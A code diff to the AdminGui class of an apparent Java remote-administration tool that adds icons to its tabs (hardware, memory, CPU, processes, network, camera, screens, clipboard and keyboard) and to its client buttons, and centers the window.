@@ -2,11 +2,14 @@ package admin.gui;
 
 import core.system.SystemInfo;
 
+import javax.imageio.ImageIO;
 import javax.swing.*;
 import javax.swing.border.Border;
 import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.File;
+import java.io.IOException;
 import java.text.ParseException;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -18,6 +21,9 @@ public class AdminGui extends JFrame {
     private JTabbedPane tpUser;
     private JPanel pnListUser;
     //OshiGui
+    private ArrayList<Image> listIcon;
+    private boolean loadIcon;
+    ImageIcon iconUser;
     public OsHwTextPanel osHwTextPanel;
     private MemoryPanel memoryPanel;
     private ProcessorPanel processorPanel;
@@ -41,6 +47,7 @@ public class AdminGui extends JFrame {
         setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         pack();
         setSize(Config.GUI_WIDTH, Config.GUI_HEIGHT);
+        setLocationRelativeTo(null);
         setVisible(true);
         si = new oshi.SystemInfo();
         systemInfo = new SystemInfo(si);
@@ -60,15 +67,9 @@ public class AdminGui extends JFrame {
         cameraPanel = new CameraPanel();
         screensPanel = new ScreensPanel();
         clipKeyboardPanel = new ClipKeyboardPanel();
-        tpUser.addTab("OS & HW Info", null, osHwTextPanel, "O");
-        tpUser.addTab("Memory", null, memoryPanel, "M");
-        tpUser.addTab("CPU", null, processorPanel, "P");
-        tpUser.addTab("FileStores", null, fileStorePanel, "F");
-        tpUser.addTab("Processes", null, processPanel, "P");
-        tpUser.addTab("Network", null, interfacePanel, "I");
-        tpUser.addTab("Camera", null, cameraPanel.createPanel(), "C");
-        tpUser.addTab("Screens", null, screensPanel.createPanel(), "S");
-        tpUser.addTab("Clipboard & Keyboard", null, clipKeyboardPanel.createPanel(), "C");
+
+        loadIcon();
+        initTab();
 
         pnListUser = new JPanel(new GridLayout(10, 1, 1, 5));
         pnListUser.setVisible(true);
@@ -77,11 +78,56 @@ public class AdminGui extends JFrame {
         add(pnListUser, BorderLayout.WEST);
     }
 
+    public void loadIcon(){
+        listIcon = new ArrayList<>();
+        loadIcon = true;
+        try {
+            listIcon.add(ImageIO.read(new File("image\\hardware.png")));
+            listIcon.add(ImageIO.read(new File("image\\ram.png")));
+            listIcon.add(ImageIO.read(new File("image\\cpu.png")));
+            listIcon.add(ImageIO.read(new File("image\\cd.png")));
+            listIcon.add(ImageIO.read(new File("image\\process.png")));
+            listIcon.add(ImageIO.read(new File("image\\network.png")));
+            listIcon.add(ImageIO.read(new File("image\\camera.png")));
+            listIcon.add(ImageIO.read(new File("image\\monitor.png")));
+            listIcon.add(ImageIO.read(new File("image\\keyboard.png")));
+            iconUser = new ImageIcon(ImageIO.read(new File("image\\programmer.png")));
+        } catch (IOException e) {
+            e.printStackTrace();
+            loadIcon = false;
+        }
+    }
+
+    public void initTab(){
+        if (loadIcon){
+            tpUser.addTab("OS & HW Info", new ImageIcon(listIcon.get(0)), osHwTextPanel, "O");
+            tpUser.addTab("Memory", new ImageIcon(listIcon.get(1)), memoryPanel, "M");
+            tpUser.addTab("CPU", new ImageIcon(listIcon.get(2)), processorPanel, "P");
+            tpUser.addTab("FileStores", new ImageIcon(listIcon.get(3)), fileStorePanel, "F");
+            tpUser.addTab("Processes", new ImageIcon(listIcon.get(4)), processPanel, "P");
+            tpUser.addTab("Network", new ImageIcon(listIcon.get(5)), interfacePanel, "I");
+            tpUser.addTab("Camera", new ImageIcon(listIcon.get(6)), cameraPanel.createPanel(), "C");
+            tpUser.addTab("Screens", new ImageIcon(listIcon.get(7)), screensPanel.createPanel(), "S");
+            tpUser.addTab("Clipboard & Keyboard", new ImageIcon(listIcon.get(8)), clipKeyboardPanel.createPanel(), "C");
+        }else {
+            tpUser.addTab("OS & HW Info", null, osHwTextPanel, "O");
+            tpUser.addTab("Memory", null, memoryPanel, "M");
+            tpUser.addTab("CPU", null, processorPanel, "P");
+            tpUser.addTab("FileStores", null, fileStorePanel, "F");
+            tpUser.addTab("Processes", null, processPanel, "P");
+            tpUser.addTab("Network", null, interfacePanel, "I");
+            tpUser.addTab("Camera", null, cameraPanel.createPanel(), "C");
+            tpUser.addTab("Screens", null, screensPanel.createPanel(), "S");
+            tpUser.addTab("Clipboard & Keyboard", null, clipKeyboardPanel.createPanel(), "C");
+        }
+    }
+
     public void addUserButtons(ArrayList<ArrayList<String>> ids) {
         listUser.clear();
         pnListUser.removeAll();
         for (ArrayList<String> id : ids) {
-            JButton button = new JButton(id.get(1) + " - " + id.get(0));
+            JButton button = new JButton(id.get(1) + " - " + id.get(0), iconUser);
+            button.setPreferredSize(new Dimension(140, 25));
             button.setVisible(true);
             setEventButton(button, id.get(0));
             listUser.add(id.get(0));
@@ -92,7 +138,8 @@ public class AdminGui extends JFrame {
     }
 
     public void addUserButton(String id, String clientHostName) {
-        JButton button = new JButton(clientHostName + " - " + id);
+        JButton button = new JButton(clientHostName + " - " + id, iconUser);
+        button.setPreferredSize(new Dimension(140, 25));
         button.setVisible(true);
         setEventButton(button, id);
         listUser.add(id);
